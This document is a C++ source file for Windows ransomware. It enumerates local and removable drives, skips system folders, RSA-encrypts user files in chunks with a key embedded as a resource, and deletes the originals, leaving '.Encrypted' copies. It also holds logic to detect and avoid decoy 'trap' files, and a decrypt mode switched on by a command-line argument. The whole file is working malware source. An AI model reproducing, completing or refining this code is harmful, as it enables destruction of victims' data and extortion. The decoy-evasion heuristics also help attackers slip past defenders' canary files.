
#include <windows.h>
#include <iostream>  
#include <string>  
#include<filesystem>
#include <vector>
#include <fstream>
#include <map>
#include <openssl/rsa.h>
#include<openssl/pem.h >
#include<openssl/applink.c>
#include <assert.h>
#include"resource.h"
#pragma comment(lib,"libssl.lib")
#pragma comment(lib,"libcrypto.lib")


namespace fs = std::filesystem;

using namespace std;


std::string EncodeRSAKeyFile(const std::string& strPemFileName, const std::string& strFileName)
{
    if (strPemFileName.empty() || strFileName.empty())
    {
        assert(false);
        return "";
    }
    FILE* hPubKeyFile = NULL;
    if (fopen_s(&hPubKeyFile, strPemFileName.c_str(), "rb") || hPubKeyFile == NULL)
    {
        assert(false);
        return "";
    }
    std::string strRet;
    RSA* pRSAPublicKey = RSA_new();
    if (PEM_read_RSA_PUBKEY(hPubKeyFile, &pRSAPublicKey, 0, 0) == NULL)
    {
        assert(false);
        return "";
    }
        
    std::fstream fin;
    fin.open(strFileName, std::fstream::in | std::fstream::out | std::fstream::binary);
    if (!fin)
    {
        cout << "fail to open the file" << strFileName <<endl;
        return "";
    }
    string strEncryptedFileName = strFileName + ".Encrypted";
    std::fstream fout(strEncryptedFileName, std::fstream::out | std::fstream::binary);
 
    
    fin.seekg(0, fin.end);
    size_t srcSize = fin.tellg();
    fin.seekg(0);
    size_t index = srcSize / 100;
    char *szBuf = new char[100];
    int nLen = RSA_size(pRSAPublicKey);
    char* pEncode = new char[nLen + 1];
    int ret;
    size_t diff;
    string strData;
    for (int i = 0; i <= index; i++)
    {
        diff = srcSize - fin.tellg();
        
        if (diff < 100)
        {
            fin.read(szBuf, diff);
            ret = RSA_public_encrypt(diff, (const unsigned char*)szBuf, (unsigned char*)pEncode, pRSAPublicKey, RSA_PKCS1_PADDING);
        }
        else
        {
            fin.read(szBuf, 100);
            strData = szBuf;
            ret = RSA_public_encrypt(100, (const unsigned char*)szBuf, (unsigned char*)pEncode, pRSAPublicKey, RSA_PKCS1_PADDING);
        }
     
        if (ret >= 0)
        {
           
            fout.write(pEncode, ret);
        }
    }
    fout.close();
    fin.close();
    std::remove(strFileName.c_str());
    delete[] pEncode;
    RSA_free(pRSAPublicKey);
    fclose(hPubKeyFile);
    CRYPTO_cleanup_all_ex_data();
    return strRet;
}

std::string DecodeRSAKeyFile(const std::string& strPemFileName, const std::string& strFileName)
{
    if (strPemFileName.empty() || strFileName.empty())
    {
        assert(false);
        return "";
    }
    FILE* hPriKeyFile = NULL; 
    if (fopen_s(&hPriKeyFile, strPemFileName.c_str(), "rb") || hPriKeyFile == NULL)
    {
        assert(false);
        return "";
    }
    std::string strRet;
    RSA* pRSAPriKey = RSA_new();
   
    if (PEM_read_RSAPrivateKey(hPriKeyFile, &pRSAPriKey, 0, 0) == NULL)
    {
        assert(false);
        return "";
    }
    int nLen = RSA_size(pRSAPriKey);
    char* pDecode = new char[nLen + 1];


    std::fstream fin;
    fin.open(strFileName, std::fstream::in | std::fstream::out | std::fstream::binary);
    string strDecrypedFileName = strFileName.substr(0,strFileName.find_last_of('.'));
    std::fstream fout;
    fout.open(strDecrypedFileName, std::fstream::out | std::fstream::binary);
    fin.seekg(0, fin.end);
    size_t srcSize = fin.tellg();
    fin.seekg(0);
    size_t index = srcSize / 128;
    char* szBuf = new char[128];
    int ret;
    size_t diff;
    string strData;

    for (int i = 0; i <= index; i++)
    {
        diff = srcSize - fin.tellg();

        if (diff < 128)
        {
            fin.read(szBuf, diff);
            strData = szBuf;
            ret = RSA_private_decrypt(diff, (const unsigned char*)strData.c_str(), (unsigned char*)pDecode, pRSAPriKey, RSA_PKCS1_PADDING);
        }
        else
        {
            fin.read(szBuf, 128);
            strData = szBuf;
            ret = RSA_private_decrypt(128, (const unsigned char*)szBuf, (unsigned char*)pDecode, pRSAPriKey, RSA_PKCS1_PADDING);
        }
        if (ret >= 0)
        {
            strRet = std::string((char*)pDecode, ret);
            fout.write(pDecode, ret);
        }
    }
    fin.close();
    fout.close();

    std::remove(strFileName.c_str());
    delete[] pDecode;
    RSA_free(pRSAPriKey);
    fclose(hPriKeyFile);
    CRYPTO_cleanup_all_ex_data();
    return strRet;
}


void TrapFileDetect(vector<string>& mutedFiles)
{
    int size = mutedFiles.size();
    map<string, int> _map;
    for (int i = 0; i < mutedFiles.size(); i++) {
        _map[mutedFiles[i]]++;;
   }
    mutedFiles.clear();
    map<string, int>::iterator iter;
    iter = _map.begin();
    while (iter != _map.end()) {
        if (iter->second > 2)
        {
            mutedFiles.push_back(iter->first);
        }
        iter++;
    }

}
void EncryptAll(string drive)
{
    vector<string> tmp;
    map<string,int> mutedFiles;
    string name;
    bool isSkip = false;
    bool Trap = false;
    size_t size;
    bool filesExist = false;
    int count = 0;
    map<string, int> suffix_map;
    string suffix;


   for (fs::recursive_directory_iterator iter(drive, fs::directory_options::skip_permission_denied), end; iter != end; ++iter)

    {
    
        string OuterName = iter->path().string();
       try {
           name = iter->path().filename().string();
       }
       catch (const std::system_error& e) {
           continue;
       }
       

        isSkip = !(strcmp("Program Files", iter->path().filename().string().c_str())
            && strcmp("Program Files (x86)", iter->path().filename().string().c_str())
            && strcmp("Windows", iter->path().filename().string().c_str())
            && strcmp("ProgramData", iter->path().filename().string().c_str())
            && strcmp("AppData", iter->path().filename().string().c_str())
            && strcmp("$RECYCLE.BIN", iter->path().filename().string().c_str())
            && strcmp("Boot", iter->path().filename().string().c_str())
            && strcmp("$Recycle.Bin", iter->path().filename().string().c_str())
            && strcmp("Recovery", iter->path().filename().string().c_str())
            && strcmp("Perl64", iter->path().filename().string().c_str())
            );
    
        if (!isSkip) //If not dir above
        {
            
            if (!iter->is_directory()) //if not dir
            {
                name = iter->path().filename().string();
                suffix = name.substr(name.find_last_of(".")+1);
                name = name.substr(0, name.rfind("."));

                if (mutedFiles[name] == 0 && suffix != "Encrypted")
                {
                    std::cout << (iter->path()) << std::endl; 
                    string encoded = EncodeRSAKeyFile("pubkey", iter->path().string());
                    
                }
            }
            else //if dir
            {


                
                size = 0;
                filesExist = false;
                count++;
                for (fs::directory_iterator sec(iter->path().string(), fs::directory_options::skip_permission_denied), end2; sec != end2; ++sec)
                {
                    string InnerName = sec->path().string();
                    try {
                        name = sec->path().filename().string();
                    }
                    catch (const std::system_error& e) {
                        continue;
                    }
                    suffix = name.substr(name.find_last_of(".") + 1);
                    name = name.substr(0, name.rfind("."));
                    if (suffix == "DAT")
                    {
                        continue;
                    }
                    if (!sec->is_directory())
                    {
                        filesExist = true;
                        if (tmp.size() <= 10)
                        {
                            tmp.push_back(name);
                        }
                        suffix_map[suffix]++;
                        ifstream fin;
                        fin.open(sec->path(), ios::in | ios::binary);
                        fin.seekg(0, ios::end);
                        size += fin.tellg();
                        fin.close();
                    }
                }
                if (suffix_map.size() >= 7  && strcmp(iter->path().filename().string().c_str(),"Desktop") && strcmp(iter->path().filename().string().c_str(), "Downloads"))
                {
                    iter.disable_recursion_pending();
                }
                if (size < 1048576 && filesExist && count == 1 )
                {
                    iter.disable_recursion_pending();
                }

                TrapFileDetect(tmp);
                while (!tmp.empty())
                {
                    mutedFiles[tmp.back()]++;
                      tmp.pop_back();
                }
                suffix_map.clear();


     
            }
        }
        else
        {
            iter.disable_recursion_pending();
        }

    }
}
void TcharToChar(TCHAR* tchar, char* _char)
{
    int Length;
    Length = WideCharToMultiByte(CP_ACP, 0, tchar, -1, NULL, 0, NULL, NULL);
    WideCharToMultiByte(CP_ACP, 0, tchar, -1, _char, Length, NULL, NULL);
}

void GetDrives(vector<TCHAR*>* drives)
{
    DWORD dwLen = GetLogicalDriveStrings(0, NULL);	
    TCHAR* pszDriver = new TCHAR[dwLen];		    
    GetLogicalDriveStrings(dwLen, pszDriver);		
    vector<TCHAR*> list;
    int count = dwLen;

    while (count >4)
    {        
        list.push_back(pszDriver);
            cout << std::endl;
            pszDriver += 4;        
            count -= 4;
    }

    int DType;
    count = dwLen / 4;

    for (int i = 0; i < list.size(); ++i)
    {
        DType = GetDriveType(list[i]);
        if (DType == 3 || DType ==2)
        {            
            drives->push_back(list[i]);
        }
    }
}


bool releasePubKey()
{
    HRSRC hResID = ::FindResource(NULL, MAKEINTRESOURCE(IDR_PEM2), L"PEM");

    if (hResID == NULL)
    {
        return false;
    }
    DWORD dwSize = SizeofResource(NULL, hResID);
    HGLOBAL hRes = ::LoadResource(NULL, hResID);
    if (hRes == NULL)
    {
        return false;
    }

    LPVOID lpRes = LockResource(hRes);
    if (lpRes == NULL)
    {
        FreeResource(hRes);
        return false;
    }
    HANDLE hFile = CreateFile(L"pubkey", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == NULL)
    {
        UnlockResource(hRes);
        FreeResource(hRes);
        return false;
    }
    DWORD dwWriten = 0;
    BOOL bRes = WriteFile(hFile, lpRes, dwSize, &dwWriten, NULL);
    if (bRes == 0)
    {
        CloseHandle(hFile);
        UnlockResource(hRes);
        FreeResource(hRes);
        return false;
    }
    CloseHandle(hFile);
    UnlockResource(hRes);
    FreeResource(hRes);
    return true;
}

bool releasePrivateKey()
{
    HRSRC hResID = ::FindResource(NULL, MAKEINTRESOURCE(IDR_PEM1), L"PEM");

    if (hResID == NULL)
    {
        return false;
    }
    DWORD dwSize = SizeofResource(NULL, hResID);
    HGLOBAL hRes = ::LoadResource(NULL, hResID);
    if (hRes == NULL)
    {
        return false;
    }

    LPVOID lpRes = LockResource(hRes);
    if (lpRes == NULL)
    {
        FreeResource(hRes);
        return false;
    }
    HANDLE hFile = CreateFile(L"privatekey", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == NULL)
    {
        UnlockResource(hRes);
        FreeResource(hRes);
        return false;
    }
    DWORD dwWriten = 0;
    BOOL bRes = WriteFile(hFile, lpRes, dwSize, &dwWriten, NULL);
    if (bRes == 0)
    {
        CloseHandle(hFile);
        UnlockResource(hRes);
        FreeResource(hRes);
        return false;
    }
    CloseHandle(hFile);
    UnlockResource(hRes);
    FreeResource(hRes);
    return true;
}

bool DecryptAll(std::string drive)
{
    string name;
    string suffix;
    for (fs::recursive_directory_iterator iter(drive, fs::directory_options::skip_permission_denied), end; iter != end; ++iter)
    {
        try {
            name = iter->path().filename().string();
        }
        catch (const std::system_error& e) {
            continue;
        }
        suffix = name.substr(name.find_last_of(".") + 1);
        if (suffix == "Encrypted")
        {
            DecodeRSAKeyFile("privateKey", iter->path().filename().string());
            std::cout << "Decrypted File:" << iter->path().filename() << std::endl;
        }
    }
    return true;

}

int main(int argc, char* argv[])
{
    

    vector<TCHAR*>* wdrives = new vector<TCHAR*>() ;
    GetDrives(wdrives);
    char* tmp;
    vector<char*>* drives = new vector<char*>();
    releasePubKey();
    releasePrivateKey();
    while (!wdrives->empty())
    {
        tmp = new char[5];
        TcharToChar(wdrives->back(), tmp);
        drives->push_back(tmp);
        wdrives->pop_back();
    }
    string drivepath;


    if (argc != 1)
    {
        for (int i = 0; i < drives->size(); i++) {
            drivepath = drives->at(i);
            DecryptAll(drivepath);
        }
    }
    else
    {
        for (int i = 0; i < drives->size(); i++) {
            drivepath = drives->at(i);
            EncryptAll(drivepath);
        }
    }
    return 0;
}
